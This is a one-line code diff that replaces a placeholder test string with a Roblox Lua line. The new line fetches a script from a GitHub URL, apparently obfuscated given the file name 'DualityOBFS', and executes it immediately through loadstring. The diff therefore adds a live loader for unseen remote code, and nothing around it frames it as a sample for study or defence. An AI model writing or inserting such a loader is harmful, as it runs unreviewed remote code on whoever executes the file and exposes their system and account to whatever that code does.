@@ -1,1 +1,1 @@
-hello this a test
+loadstring(game:HttpGet("https://github.com/fizzyscripting/nan/raw/refs/heads/main/DualityOBFS"))()
